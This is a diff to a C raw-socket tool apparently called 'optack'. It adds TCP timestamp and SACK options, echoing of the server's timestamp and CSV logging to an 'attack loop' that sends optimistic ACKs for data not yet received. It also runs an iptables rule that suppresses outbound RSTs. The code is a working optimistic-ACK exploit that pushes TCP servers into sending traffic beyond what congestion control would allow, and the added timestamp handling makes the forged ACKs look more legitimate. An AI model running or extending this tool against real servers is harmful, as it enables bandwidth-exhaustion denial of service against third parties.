@@ -124,6 +124,9 @@ struct cfg {
     uint16_t src_port, dst_port;
     int lazy;
     int verbose;
+    int use_ts;                /* negotiate + echo TCP timestamps */
+    int use_sack;             /* offer SACK-permitted */
+    const char *logpath;       /* if set, periodic delivered/acked CSV */
     double duration;
     uint8_t wscale;            /* window scale shift we advertise */
     uint16_t adv_win;          /* window field value (before scaling) */
@@ -188,6 +191,55 @@ static int is_ours(const struct iphdr *ip, const struct tcphdr *tcp,
            tcp->dest == htons(c->src_port);
 }
 
+/* Build SYN TCP options (MSS, optional SACK-permitted, optional timestamps,
+ * window scale), NOP-padded to a 4-byte boundary. Returns option length. */
+static size_t build_syn_opts(uint8_t *o, const struct cfg *c, uint32_t tsval) {
+    size_t n = 0;
+    o[n++] = 2; o[n++] = 4; o[n++] = 0x05; o[n++] = 0xb4;   /* MSS = 1460 */
+    if (c->use_sack) { o[n++] = 4; o[n++] = 2; }            /* SACK permitted */
+    if (c->use_ts) {
+        o[n++] = 8; o[n++] = 10;
+        uint32_t v = htonl(tsval), e = 0;
+        memcpy(o + n, &v, 4); n += 4;                        /* TSval  */
+        memcpy(o + n, &e, 4); n += 4;                        /* TSecr=0 in SYN */
+    }
+    o[n++] = 1;                                              /* NOP */
+    o[n++] = 3; o[n++] = 3; o[n++] = c->wscale;              /* window scale */
+    while (n % 4) o[n++] = 1;                                /* pad with NOPs */
+    return n;
+}
+
+/* Build data-ACK TCP options: a timestamp option (NOP-padded) when enabled,
+ * else none. Returns option length (0 or 12). */
+static size_t build_ack_opts(uint8_t *o, const struct cfg *c,
+                             uint32_t tsval, uint32_t tsecr) {
+    if (!c->use_ts) return 0;
+    size_t n = 0;
+    o[n++] = 1; o[n++] = 1;                                  /* NOP NOP align */
+    o[n++] = 8; o[n++] = 10;
+    uint32_t v = htonl(tsval), e = htonl(tsecr);
+    memcpy(o + n, &v, 4); n += 4;
+    memcpy(o + n, &e, 4); n += 4;
+    return n;                                                /* = 12 */
+}
+
+/* Extract the server's TSval from a received segment's timestamp option.
+ * Returns 1 and sets *tsval if present, else 0. */
+static int parse_ts(const struct tcphdr *tcp, uint32_t *tsval) {
+    const uint8_t *o = (const uint8_t *)tcp + sizeof(*tcp);
+    const uint8_t *end = (const uint8_t *)tcp + tcp->doff * 4;
+    while (o < end) {
+        if (o[0] == 0) break;                                /* end of options */
+        if (o[0] == 1) { o++; continue; }                    /* NOP */
+        if (o + 1 >= end || o[1] < 2 || o + o[1] > end) break;
+        if (o[0] == 8 && o[1] == 10) {
+            uint32_t v; memcpy(&v, o + 2, 4); *tsval = ntohl(v); return 1;
+        }
+        o += o[1];
+    }
+    return 0;
+}
+
 /* run iptables to add ("-A") or remove ("-D") the outbound-RST suppressor. */
 static void rst_rule(const char *op, const char *target_ip) {
     char cmd[256];
@@ -202,6 +254,7 @@ static void rst_rule(const char *op, const char *target_ip) {
 int main(int argc, char **argv) {
     struct cfg c = {
         .src_port = 0, .dst_port = 5000, .lazy = 0, .verbose = 0,
+        .use_ts = 0, .use_sack = 0, .logpath = NULL,
         .duration = 15.0, .wscale = 7, .adv_win = 65535,
         .max_ahead = 4u * 1024 * 1024, .interval_ms = 1.0,
     };
@@ -214,10 +267,14 @@ int main(int argc, char **argv) {
         else if (!strcmp(argv[i], "--maxahead") && i + 1 < argc) c.max_ahead = (uint32_t)atoi(argv[++i]) * 1024u;
         else if (!strcmp(argv[i], "--interval") && i + 1 < argc) c.interval_ms = atof(argv[++i]);
         else if (!strcmp(argv[i], "--lazy")) c.lazy = 1;
+        else if (!strcmp(argv[i], "--timestamps")) c.use_ts = 1;
+        else if (!strcmp(argv[i], "--sack")) c.use_sack = 1;
+        else if (!strcmp(argv[i], "--log") && i + 1 < argc) c.logpath = argv[++i];
         else if (!strcmp(argv[i], "-v") || !strcmp(argv[i], "--verbose")) c.verbose = 1;
         else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) {
             printf("usage: %s --target <host> --port <p> [--duration s] "
-                   "[--maxahead KB] [--interval ms] [--lazy] [-v]\n", argv[0]);
+                   "[--maxahead KB] [--interval ms] [--lazy] "
+                   "[--timestamps] [--sack] [--log FILE] [-v]\n", argv[0]);
             return 0;
         } else {
             fprintf(stderr, "unknown arg: %s\n", argv[i]);
@@ -263,16 +320,14 @@ int main(int argc, char **argv) {
 
     rst_rule("-A", dst_str);
 
-    uint8_t buf[2048];
+    uint8_t buf[2048], opts[40];
+    uint32_t ts_recent = 0;    /* latest server TSval, echoed back in TSecr */
+    int ts_negotiated = 0;     /* server offered timestamps in the SYN-ACK */
+#define OUR_TSVAL ((uint32_t)(now_s() * 1000.0))
 
     /* ---- 3-way handshake ---- */
-    /* SYN with MSS 1460 + window scale. */
-    uint8_t synopt[8] = {
-        2, 4, 0x05, 0xb4,       /* MSS = 1460 */
-        1,                       /* NOP */
-        3, 3, c.wscale,          /* window scale */
-    };
-    size_t len = build_packet(buf, &c, isn, 0, TH_SYN, c.adv_win, synopt, sizeof(synopt));
+    size_t optlen = build_syn_opts(opts, &c, OUR_TSVAL);
+    size_t len = build_packet(buf, &c, isn, 0, TH_SYN, c.adv_win, opts, optlen);
 
     uint32_t server_isn = 0;
     int established = 0;
@@ -290,6 +345,7 @@ int main(int argc, char **argv) {
             if (!is_ours(ip, tcp, &c)) continue;
             if (tcp->syn && tcp->ack) {
                 server_isn = ntohl(tcp->seq);
+                if (c.use_ts && parse_ts(tcp, &ts_recent)) ts_negotiated = 1;
                 established = 1;
                 break;
             }
@@ -310,10 +366,18 @@ int main(int argc, char **argv) {
     uint32_t rcv_nxt = server_isn + 1; /* highest byte we have actually seen */
     uint32_t ack_no = rcv_nxt;         /* what we will claim to have received */
 
+    if (c.use_ts && !ts_negotiated) {
+        fprintf(stderr, "[optack] note: server did not negotiate timestamps; "
+                        "continuing without them\n");
+        c.use_ts = 0;
+    }
+
     /* Final ACK completes the handshake; the server starts streaming. */
-    len = build_packet(buf, &c, my_seq, ack_no, TH_ACK, c.adv_win, NULL, 0);
+    optlen = build_ack_opts(opts, &c, OUR_TSVAL, ts_recent);
+    len = build_packet(buf, &c, my_seq, ack_no, TH_ACK, c.adv_win, opts, optlen);
     send_pkt(sfd, &c, buf, len);
-    fprintf(stderr, "[optack] connection established, streaming begins\n");
+    fprintf(stderr, "[optack] connection established%s, streaming begins\n",
+            c.use_ts ? " (timestamps on)" : "");
 
     /* ---- attack loop ----
      *
@@ -337,8 +401,15 @@ int main(int argc, char **argv) {
     double t0 = now_s();
     double next_ack = t0;
     double eval_t = t0;
+    double next_log = t0;
     uint32_t eval_base = rcv_nxt;
     unsigned long long acks_sent = 0, bytes_seen = 0;
+
+    FILE *logf = NULL;
+    if (c.logpath) {
+        logf = fopen(c.logpath, "w");
+        if (logf) fprintf(logf, "t_s,delivered_bytes,acked_bytes,ack_ahead_bytes\n");
+    }
 
     while (g_running && (now_s() - t0) < c.duration) {
         double t = now_s();
@@ -355,6 +426,7 @@ int main(int argc, char **argv) {
                 struct tcphdr *tcp = (struct tcphdr *)(rb + ip->ihl * 4);
                 if (!is_ours(ip, tcp, &c)) continue;
                 if (tcp->rst) { fprintf(stderr, "[optack] got RST, stopping\n"); g_running = 0; break; }
+                if (c.use_ts) parse_ts(tcp, &ts_recent);   /* echo latest server TSval */
                 size_t hdrs = ip->ihl * 4 + tcp->doff * 4;
                 size_t payload = ntohs(ip->tot_len) > hdrs ? ntohs(ip->tot_len) - hdrs : 0;
                 if (payload > 0) {
@@ -384,9 +456,17 @@ int main(int argc, char **argv) {
 
         ack_no = c.lazy ? rcv_nxt : rcv_nxt + ahead;
 
-        len = build_packet(buf, &c, my_seq, ack_no, TH_ACK, c.adv_win, NULL, 0);
+        optlen = build_ack_opts(opts, &c, OUR_TSVAL, ts_recent);
+        len = build_packet(buf, &c, my_seq, ack_no, TH_ACK, c.adv_win, opts, optlen);
         send_pkt(sfd, &c, buf, len);
         acks_sent++;
+
+        if (logf && t >= next_log) {
+            next_log = t + 0.2;
+            unsigned long long deliv = rcv_nxt - (server_isn + 1);
+            unsigned long long acked = ack_no - (server_isn + 1);
+            fprintf(logf, "%.3f,%llu,%llu,%llu\n", t - t0, deliv, acked, acked - deliv);
+        }
 
         if (c.verbose && (acks_sent % 1000 == 0)) {
             fprintf(stderr, "[optack] t=%.1fs recv=%.2f MB ack-ahead=%uKB acks=%llu\n",
@@ -406,6 +486,7 @@ int main(int argc, char **argv) {
             elapsed, acks_sent, bytes_seen, bytes_seen * 8.0 / (elapsed * 1e6),
             (int)(ack_no - rcv_nxt));
 
+    if (logf) fclose(logf);
     close(sfd);
     close(rfd);
     return 0;
